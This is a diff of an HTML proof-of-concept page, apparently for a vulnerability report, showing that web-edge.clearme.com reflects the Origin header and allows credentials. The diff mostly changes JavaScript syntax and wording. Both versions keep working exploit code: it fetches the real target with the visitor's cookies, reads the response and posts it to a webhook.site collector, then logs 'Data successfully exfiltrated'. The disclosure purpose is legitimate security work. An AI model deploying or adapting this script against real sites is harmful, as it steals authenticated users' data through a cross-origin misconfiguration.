@@ -2,7 +2,7 @@
   <html lang="en">
   <head>
   <meta charset="UTF-8">
-  <title>CORS Exfiltration PoC - Clearme</title>
+  <title>CORS Exfiltration PoC – Clearme</title>
   <style>
     body {font-family:Arial,Helvetica,sans-serif; margin:2rem;}
     pre {background:#f4f4f4; padding:1rem; border:1px solid #ddd;
@@ -12,10 +12,9 @@
   <body>
 
   <h2>CORS Exfiltration Proof of Concept</h2>
-  <p>If you are logged into Clearme, this page will attempt to read data
-  from
-     <code>https://web-edge.clearme.com/</code> and send it to your
-  webhook collector.</p>
+  <p>This page demonstrates that <code>web-edge.clearme.com</code>
+  reflects the Origin header and allows credentials – no Clearme account
+  is required to see the vulnerability.</p>
 
   <pre id="log"></pre>
 
@@ -23,16 +22,16 @@
     // ---------------------------------------------------------------
     // Configuration – edit only these two lines if needed
     // ---------------------------------------------------------------
-    const TARGET_URL   = 'https://web-edge.clearme.com/';          // 
+    var TARGET_URL   = 'https://web-edge.clearme.com/';          // 
   endpoint to test
-    const COLLECTOR    =
+    var COLLECTOR    =
   'https://webhook.site/9b73a4e3-5b36-4493-9eaa-f81197d7f937'; // <-- YOUR
   webhook URL
     // ---------------------------------------------------------------
 
     // Helper to append text to the <pre> box
     function log(msg) {
-      const el = document.getElementById('log');
+      var el = document.getElementById('log');
       el.textContent += msg + '\n';
       el.scrollTop = el.scrollHeight; // keep newest lines visible
     }
@@ -40,26 +39,28 @@
     // Perform the cross‑origin request with credentials
     fetch(TARGET_URL, {
       method: 'GET',
-      credentials: 'include',   // <-- sends cookies (sessionId, etc.)
+      credentials: 'include',   // <-- sends cookies (will be empty if not
+  logged in)
       mode: 'cors'
     })
-    .then(response => {
+    .then(function(response) {
       log('[+] Request to ' + TARGET_URL);
       log('    Status: ' + response.status);
       log('    Headers: ' +
-  JSON.stringify([...response.headers.entries()]));
+  JSON.stringify(Array.from(response.headers.entries())));
       // Try to read the body as text (fallback to empty string on error)
-      return response.text().then(text => ({status: response.status, body:
-  text}));
+      return response.text().then(function(text) {
+        return {status: response.status, body: text};
+      });
     })
-    .then(({status, body}) => {
-      log('    Response Body (first 500 chars):\n' + body.substring(0,
-  500));
+    .then(function(result) {
+      log('    Response Body (first 500 chars):\n' +
+  result.body.substring(0, 500));
       // Build the payload to send to the collector
-      const payload = {
+      var payload = {
         url: TARGET_URL,
-        status: status,
-        body: body   // you can trim this if the body is huge
+        status: result.status,
+        body: result.body   // you can trim this if the body is huge
       };
       // Send the data to your webhook collector
       return fetch(COLLECTOR, {
@@ -69,10 +70,10 @@
         body: JSON.stringify(payload)
       });
     })
-    .then(() => {
+    .then(function() {
       log('[+] Data successfully exfiltrated to webhook.site');
     })
-    .catch(err => {
+    .catch(function(err) {
       log('[-] Error: ' + err);
       // Even if something went wrong, we still show that the browser 
   allowed the request
@@ -80,6 +81,6 @@
   with credentials.');
     });
   </script>
-
+  
   </body>
   </html>
